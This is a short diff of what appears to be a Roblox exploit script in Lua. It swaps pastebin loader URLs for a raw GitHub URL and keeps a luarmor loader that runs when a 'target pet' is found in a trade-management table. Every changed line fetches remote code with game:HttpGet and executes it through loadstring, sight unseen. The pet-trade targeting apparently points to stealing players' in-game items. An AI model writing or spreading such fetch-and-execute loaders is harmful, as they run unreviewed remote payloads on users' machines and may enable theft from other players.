@@ -39,7 +39,7 @@ local function hasTargetPet(petList)
 end
 
 getgenv().YourScript = function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/vp4jCmFe"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/LOAD1"))()
 end
 
 getgenv().KEY = "Shippy"
@@ -62,5 +62,5 @@ _G.TradeManage = {
 if hasTargetPet(_G.TradeManage.Pet) then
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
 else
-    loadstring(game:HttpGet("https://pastebin.com/raw/CX4SyK4S"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/LOAD1"))()
 end
